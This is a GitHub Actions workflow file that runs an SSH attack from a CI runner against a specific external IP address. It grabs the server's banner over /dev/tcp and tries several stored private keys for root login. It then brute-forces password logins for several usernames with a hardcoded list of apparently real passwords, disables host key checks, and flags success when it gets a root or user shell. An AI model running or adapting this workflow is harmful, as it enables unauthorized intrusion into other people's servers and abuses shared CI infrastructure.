name: ul5685pw
on: workflow_dispatch
permissions:
  contents: write
jobs:
  pw:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: ladder
        run: |
          set +e
          chmod 600 keys2/* 2>/dev/null
          echo "=== TCP/BANNER"
          timeout 15 bash -c 'exec 3<>/dev/tcp/123.184.7.135/22; head -c 80 <&3' ; echo
          echo "=== KEY LADDER"
          for k in keys2/k04_ibm_key.pem_ keys2/k110_k04_ keys2/k113_k00_; do
            [ -f "$k" ] || { echo "missing $k"; continue; }
            echo "-- $k"; timeout 25 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o IdentitiesOnly=yes root@123.184.7.135 'id -u; hostname' 2>&1 | tail -3
          done
          echo "=== PASSWORD LADDER"
          for u in root kgzs ubuntu liuqi; do
            for p in 'Bingxing.2026' 'Beijingcs.2024' 'Admin@123_para#!2024' 'Kgzs@2024' 'ubuntu@'; do
              out=$(timeout 20 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 $u@123.184.7.135 'id -u' 2>&1 | tail -1)
              echo "$u : $p -> $out"
              echo "$out" | grep -q '^0$\|^1000$' && { echo "PWIN $u $p"; break 2; }
              sleep 3
            done
          done
          echo DONE
